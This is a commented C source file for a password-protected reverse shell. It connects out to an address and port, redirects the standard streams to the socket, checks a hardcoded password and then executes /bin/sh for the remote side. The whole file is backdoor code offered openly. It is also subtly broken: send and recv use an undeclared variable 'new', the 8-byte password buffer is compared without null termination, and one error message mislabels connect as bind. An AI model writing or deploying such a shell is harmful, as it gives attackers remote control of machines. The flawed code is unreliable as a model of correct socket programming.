/**
Date 31/08/2014
This program redirects a shell to the remote machine
**/
#include<stdio.h>
#include<stdlib.h>
#include<sys/socket.h>
#include<sys/types.h>
#include<netinet/in.h>
#include<error.h>
#include<strings.h>
#include<unistd.h>
#include<arpa/inet.h>

#define ERROR	-1

main(int argc, char **argv)
{
	struct sockaddr_in server;
	int sock;
	int sockaddr_len = sizeof(struct sockaddr_in);
	char *arguments[] = { "/bin/sh", 0 };
	char password[8];	
	
	/**
		socket - create an endpoint for communication
		The socket() function shall create an unbound
		socket in a communications domain, and return
		a file descriptor that can be used in later
		function calls that operate on sockets.
 
		#include <sys/socket.h>
		int socket(int domain, int type, int protocol);
	**/	
	if((sock = socket(AF_INET, SOCK_STREAM, 0)) == ERROR)
	{
		perror("server socket: ");
		exit(-1);
	}
	
	/**
		#include <netinet/in.h>
		sockaddr_in
 
		Structures for handling internet addresses
	**/	
	server.sin_family = AF_INET;
	server.sin_port = htons(atoi(argv[1]));
	server.sin_addr.s_addr = inet_addr("127.0.0.1");
	bzero(&server.sin_zero, 8);
	
	/**
		the connect() call attempts to establish a connection between two sockets.
 
		#include <sys/socket.h>
		int connect(int socket, const struct sockaddr *address, size_t address_len);
	**/		
	if((connect(sock, (struct sockaddr *)&server, sockaddr_len)) == ERROR)
	{
		perror("bind : ");
		exit(-1);
	}

	/**
		The dup2() duplicates one file descriptor, making them
		aliases, and then deleting the old file descriptor. This
		becomes very useful when attempting to redirect output.
 
		We call three times passing as paratemers in fildes2:
		- 0: stdin
		- 1: stdout
		- 2: stderr
 
		#include <unistd.h>
		int dup2(int fildes, int fildes2);
	**/
	dup2(sock, 0);
	dup2(sock, 1);
	dup2(sock, 2);

	/**
		send a message on a socket

		#include<sys/socket.h>
		ssize_t send(int sockfd, const void *buf, size_t len, int flags);
	**/
	send(new, "Password", 8, 0);

	/**
		receive a message on a socket
		
		#include<sys/socket.h>
		ssize_t recv(int sockfd, void *buf, size_t len, int flags);
	**/
        recv(new, password, 8, 0);	

	//compare the password sent
        if(strcmp(password, "jtejedor") == 0)
        {
		/**
			execve - execute program
 
			#include <unistd.h>
			int execve(const char *filename, char *const argv[], char *const envp[]);
 
		**/
		//because we are redirect the output of the connection, when we execute it, we are redirecting a shell
		//to the remote machine
                execve(arguments[0], &arguments[0], NULL);
        }

	exit(-1);
		
}

	
